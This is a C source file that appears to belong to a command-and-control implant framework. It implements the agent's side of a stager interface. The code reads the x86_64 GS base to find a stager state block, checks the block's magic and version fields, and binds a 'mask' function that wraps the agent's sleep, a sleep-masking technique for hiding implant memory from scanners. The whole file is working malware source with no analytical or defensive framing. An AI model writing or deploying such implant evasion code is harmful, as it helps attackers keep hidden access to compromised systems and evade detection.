#define _GNU_SOURCE

/*
 * stager_iface.c — read the stager's same-process mask entry point.
 *
 * The stager installs its state block as the x86_64 GS base before the agent
 * starts. The block's first field is a self pointer, followed by the ABI
 * magic/version and the mask function. Nothing is passed through a descriptor.
 */

#include "stager_iface.h"

#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef ARCH_GET_GS
#define ARCH_GET_GS 0x1004
#endif

static c2_stager_mask_fn g_mask_fn;

int c2_stager_mask_bind(void) {
  if (g_mask_fn != NULL)
    return 0;
#if !defined(__x86_64__)
  return -1;
#else
  uintptr_t base = 0;
  if (syscall(SYS_arch_prctl, ARCH_GET_GS, (unsigned long *)&base) != 0 ||
      base == 0)
    return -1;

  /* Reject an inherited/non-stager GS base without faulting on it. */
  long page = sysconf(_SC_PAGESIZE);
  if (page <= 0)
    page = 4096;
  unsigned char vec = 0;
  uintptr_t page_base = base & ~((uintptr_t)page - 1);
  if (mincore((void *)page_base, (size_t)page, &vec) != 0)
    return -1;

  struct c2_stager_public pub;
  memcpy(&pub, (const void *)base, sizeof(pub));
  if (pub.self != (void *)base || pub.abi_magic != C2_STAGER_ABI_MAGIC ||
      pub.abi_version != C2_STAGER_ABI_VERSION || pub.mask_fn == NULL)
    return -1;
  g_mask_fn = pub.mask_fn;
  return 0;
#endif
}

int c2_stager_mask_available(void) { return g_mask_fn != NULL; }

int c2_stager_masked_sleep(unsigned seconds) {
  if (g_mask_fn == NULL)
    return -1;
  if (seconds == 0)
    seconds = 1;
  return g_mask_fn(seconds,
                   (uintptr_t)(void *)&c2_stager_masked_sleep) == 0
             ? 0
             : -1;
}
